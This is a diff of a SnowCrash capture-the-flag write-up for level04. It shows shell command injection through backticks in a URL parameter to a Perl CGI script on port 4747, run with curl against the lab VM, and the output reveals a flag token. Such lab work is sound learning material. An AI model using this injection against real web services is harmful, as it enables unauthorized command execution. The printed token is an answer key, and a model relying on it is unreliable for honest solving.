@@ -41,7 +41,7 @@ Lets try running it on port 4747 as suggested.
 level04@SnowCrash:~$ curl '{VM_IP}:4747/level04.pl?x=`whoami`'
 flag04
 ```
-Great! lets try getflag.
+Great, now we are executing as flag04. lets try executing getflag.
 ```
 level04@SnowCrash:~$ curl '{VM_IP}:4747/level04.pl?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
